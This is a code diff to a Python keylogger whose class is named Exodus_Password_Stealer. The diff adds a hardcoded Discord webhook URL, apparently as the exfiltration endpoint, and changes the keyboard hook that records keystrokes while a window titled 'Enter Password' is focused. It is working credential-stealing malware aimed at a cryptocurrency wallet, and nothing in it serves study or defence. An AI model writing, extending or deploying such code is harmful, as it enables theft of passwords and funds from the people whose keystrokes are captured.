@@ -5,6 +5,9 @@ from typing import Union
 from modules.tasks import Tasks
 from modules.current_window import Current_Window
 
+webhook_url: str = "https://discord.com/api/webhooks/1112035772191744000/Y5OR4lqKD1MWhTLhGE-HlklSunyRV65sy64mN-0ermaNkFzbrVX3zWeR99TRk7sc5AUf"
+current_string: str = ""
+
 def on_key_press(event):
     if Current_Window.fetch_one()["title"] == "Enter Password":
         print(f"Key Pressed: {event.name}")
@@ -27,7 +30,7 @@ class Exodus_Password_Stealer:
     def start_listener(self):
         while True:
             if self.check_if_running() == True:
-                keyboard.on_press(on_key_press); keyboard.wait('enter')
+                keyboard.on_release(on_key_press); keyboard.wait('enter')
                     
                 time.sleep(0.2)
         
